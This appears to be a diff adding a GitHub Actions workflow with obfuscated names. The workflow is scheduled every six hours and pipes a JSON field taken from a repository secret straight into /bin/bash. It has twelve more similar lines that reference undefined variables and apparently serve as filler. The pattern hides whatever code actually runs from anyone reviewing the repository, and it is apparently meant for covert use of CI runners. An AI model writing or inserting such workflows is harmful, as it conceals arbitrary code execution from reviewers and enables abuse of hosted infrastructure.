@@ -1,0 +1,30 @@
+name: qianduole7681
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianduole7681
+        env:
+          p346: ${{ secrets.p346 }}
+        run: |
+          echo $p346 | jq -r .uk77 | /bin/bash
+          echo $lcgka3 | jq -r .fp992 | /bin/bash
+          echo $zoys917 | jq -r .fc096 | /bin/bash
+          echo $kf0214 | jq -r .ogyl65 | /bin/bash
+          echo $nntrv27889 | jq -r .pxa8 | /bin/bash
+          echo $dpr1766 | jq -r .nu288 | /bin/bash
+          echo $ckppz41 | jq -r .yb11422 | /bin/bash
+          echo $q901 | jq -r .cljie614 | /bin/bash
+          echo $eso8525 | jq -r .xcs9 | /bin/bash
+          echo $xgm860 | jq -r .nfek905 | /bin/bash
+          echo $e51723 | jq -r .viqp94045 | /bin/bash
+          echo $ozw75123 | jq -r .al6 | /bin/bash
+          echo $imq95799 | jq -r .e7835 | /bin/bash
+
